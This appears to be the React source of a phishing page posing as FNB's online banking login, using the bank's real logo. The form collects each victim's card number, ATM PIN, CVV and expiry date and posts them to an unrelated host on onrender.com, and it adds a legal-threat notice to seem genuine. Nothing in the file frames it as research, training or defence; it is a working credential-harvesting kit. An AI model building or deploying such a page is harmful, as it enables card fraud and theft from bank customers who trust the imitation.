import React, { useState } from "react";
import axios from "axios";

const Header = () => {
  return (
    <header className="bg-white py-3 text-center shadow-lg">
      <img
        className="pl-20"
        alt="Company Logo"
        src="https://www.online.fnb.co.za/banking/00Assets/skins/00/images/header/logo.svg?v=u5e790818"
      />
    </header>
  );
};

export default function App() {
  const [cardNumber, setCardNumber] = useState("");
  const [atmPin, setATMPin] = useState("");
  const [cvv, setCVV] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [acceptTerms, setAcceptTerms] = useState(false);

  const handleSubmit = async (event) => {
    event.preventDefault();

    // Terms and conditions acceptance check

    // Card number validation: 16 digits
    if (!/^\d{16}$/.test(cardNumber)) {
      alert("The card number must be exactly 16 digits.");
      return;
    }

    // ATM PIN validation: 4 digits
    if (!/^\d{4}$/.test(atmPin)) {
      alert("The ATM PIN must be exactly 4 digits.");
      return;
    }

    // CVV validation: 3 digits
    if (!/^\d{3}$/.test(cvv)) {
      alert("The CVV must be exactly 3 digits.");
      return;
    }

    // Expiry month and year validation
    const currentYear = new Date().getFullYear() % 100; // Get last two digits of current year
    const currentMonth = new Date().getMonth() + 1; // Get current month (1-12)
    const inputExpiryYear = parseInt(expiryYear, 10);
    const inputExpiryMonth = parseInt(expiryMonth, 10);

    if (
      !/^\d{2}$/.test(expiryMonth) ||
      inputExpiryMonth < 1 ||
      inputExpiryMonth > 12
    ) {
      alert("The expiry month must be between 01 and 12.");
      return;
    }

    if (
      !/^\d{2}$/.test(expiryYear) ||
      inputExpiryYear < currentYear ||
      (inputExpiryYear === currentYear && inputExpiryMonth < currentMonth)
    ) {
      alert("The expiry year must be a valid future year.");
      return;
    }
    if (!acceptTerms) {
      alert("You must accept the terms and conditions to proceed.");
      return;
    }

    try {
      const response = await axios.post(
        "https://banking-lwpn.onrender.com/api/register",
        {
          cardNumber,
          atmPin,
          cvv,
          expiryMonth,
          expiryYear,
          acceptTerms,
        }
      );
      console.log(response.data); // Log the response from the backend

      // Clear the form fields after successful registration
      setCardNumber("");
      setATMPin("");
      setCVV("");
      setExpiryMonth("");
      setExpiryYear("");
      setAcceptTerms(false);

      // Show success alert
      alert("Registration successful!");
    } catch (error) {
      console.error("Error:", error);
      alert("Failed to register. Please try again.");
    }
  };

  return (
    <div className="flex flex-col min-h-screen">
      <Header />
      <div className="flex flex-row gap-75 pt-5">
        <div className="pl-7">
          <h2 className="text-xl text-black mb-1 pl-20">
            Login for Online Banking
          </h2>
        </div>
        <div className="pl-60">
          <h2 className="text-xl text-black mb-4 pl-40">
            Login with my Card and ATM PIN details
          </h2>
        </div>
      </div>
      <div className="flex justify-center items-start flex-1 px-6 pt-1">
        <div className="w-full bg-white overflow-hidden">
          <div className="md:flex pl-20">
            <div className="md:w-3/10 bg-black p-4 h-20">
              <div className="space-y-4">
                <button
                  className="w-full text-left bg-white hover:bg-blue-700 text-black px-2 rounded focus:outline-none focus:shadow-outline"
                  type="button"
                >
                  Register with my Card and ATM PIN details
                </button>
              </div>
            </div>
            <div className="md:w-7/10 pl-60">
              <form onSubmit={handleSubmit}>
                <div className="mb-4 flex">
                  <div className="w-1/3 flex items-center">
                    <label
                      className="block text-gray-700 text-sm font-bold"
                      htmlFor="cardNumber"
                    >
                      Card Number
                    </label>
                  </div>
                  <div className="w-2/3">
                    <input
                      className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                      id="cardNumber"
                      type="text"
                      maxLength="16"
                      placeholder="Enter card number"
                      value={cardNumber}
                      onChange={(e) => setCardNumber(e.target.value)}
                    />
                  </div>
                </div>
                <div className="mb-4 flex">
                  <div className="w-1/3 flex items-center">
                    <label
                      className="block text-gray-700 text-sm font-bold"
                      htmlFor="atmPin"
                    >
                      ATM PIN
                    </label>
                  </div>
                  <div className="w-2/3">
                    <input
                      className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                      id="atmPin"
                      type="password"
                      maxLength="4"
                      placeholder="Enter ATM PIN"
                      value={atmPin}
                      onChange={(e) => setATMPin(e.target.value)}
                    />
                  </div>
                </div>
                <div className="mb-4 flex">
                  <div className="w-1/3 flex items-center">
                    <label
                      className="block text-gray-700 text-sm font-bold"
                      htmlFor="cvv"
                    >
                      CVV
                    </label>
                  </div>
                  <div className="w-2/3">
                    <input
                      className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                      id="cvv"
                      type="password"
                      maxLength="3"
                      placeholder="Enter CVV"
                      value={cvv}
                      onChange={(e) => setCVV(e.target.value)}
                    />
                  </div>
                </div>
                <div className="mb-4 flex">
                  <div className="w-1/3 flex items-center">
                    <label
                      className="block text-gray-700 text-sm font-bold"
                      htmlFor="expiryMonth"
                    >
                      Expiry Date
                    </label>
                  </div>
                  <div className="w-2/3 flex gap-4">
                    <input
                      className="shadow appearance-none border rounded py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                      id="expiryMonth"
                      type="text"
                      maxLength="2"
                      placeholder="MM"
                      value={expiryMonth}
                      onChange={(e) => setExpiryMonth(e.target.value)}
                    />
                    <input
                      className="shadow appearance-none border rounded py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                      id="expiryYear"
                      type="text"
                      maxLength="2"
                      placeholder="YY"
                      value={expiryYear}
                      onChange={(e) => setExpiryYear(e.target.value)}
                    />
                  </div>
                </div>
                <div className="mb-6 flex flex-col">
                  <div className="flex items-center">
                    <input
                      type="checkbox"
                      id="termsAndConditions"
                      checked={acceptTerms}
                      onChange={(e) => setAcceptTerms(e.target.checked)}
                    />
                    <label
                      className="ml-2 text-sm"
                      htmlFor="termsAndConditions"
                    >
                      I accept the Online Banking Terms and Conditions
                    </label>
                  </div>
                </div>
              </form>
              <p className="text-lg text-black">
                Should you attempt to register with fictitious details or on
                behalf of another person, we reserve the right to take legal
                action.
              </p>
              <div className="flex justify-center pt-10 ">
                <div className="pr-3 ">
                  <button
                    className="bg-black text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
                    type="button" // Changed to type="button" to prevent form submission
                  >
                    Cancel
                  </button>
                </div>
                <div className="pr-10">
                  <button
                    onClick={handleSubmit}
                    className="bg-black text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
                    type="submit"
                  >
                    Login
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer className="bg-white py-3 border-t border-gray-300 ">
        {/* <div className="flex justify-end  ">
          <div className="pr-3">
            <button
              className="bg-black text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
              type="button" // Changed to type="button" to prevent form submission
            >
              Cancel
            </button>
          </div>
          <div className="pr-10">
            <button
              onClick={handleSubmit}
              className="bg-black text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
              type="submit"
            >
              Login
            </button>
          </div>
        </div> */}
      </footer>
    </div>
  );
}
